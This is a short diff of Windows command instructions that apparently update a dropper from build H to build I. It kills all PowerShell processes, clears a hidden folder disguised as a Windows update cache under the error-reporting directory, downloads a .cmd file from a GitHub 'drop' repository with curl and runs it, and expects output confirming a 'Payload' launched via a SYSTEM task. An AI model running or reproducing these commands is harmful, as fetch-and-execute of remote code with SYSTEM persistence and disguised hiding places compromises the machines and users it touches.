@@ -1,17 +1,14 @@
-# THIS verify log was still BUILD F (killed at PHASE 0). Use h.cmd:
+# Use i.cmd (H had a broken PowerShell caret launch)
 
 taskkill /F /IM powershell.exe >nul 2>&1
-del /f /q C:\WINDOWS\TEMP\go.cmd C:\WINDOWS\TEMP\g.cmd C:\WINDOWS\TEMP\h.cmd
+del /f /q C:\WINDOWS\TEMP\go.cmd C:\WINDOWS\TEMP\g.cmd C:\WINDOWS\TEMP\h.cmd C:\WINDOWS\TEMP\i.cmd
 attrib -h -s -r "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\*" /s >nul 2>&1
 del /f /q "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\*"
 
-curl.exe -L -o C:\WINDOWS\TEMP\h.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/h.cmd
-C:\WINDOWS\TEMP\h.cmd
+curl.exe -L -o C:\WINDOWS\TEMP\i.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/i.cmd
+C:\WINDOWS\TEMP\i.cmd
 
-# MUST see exactly:
-#   === GO.CMD BUILD 20260729H ===
-#   launched via SYSTEM task
-# SC "Killed after 10000ms" is OK.
-# Wait 90 seconds, then:
-#   type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\.diag.log"
-# Expect "PHASE 0 complete" and later lines - not only 3 lines.
+# MUST see:
+#   === GO.CMD BUILD 20260729I ===
+#   Payload OK [...], launched via SYSTEM task
+# Then wait 90s and type the .diag.log
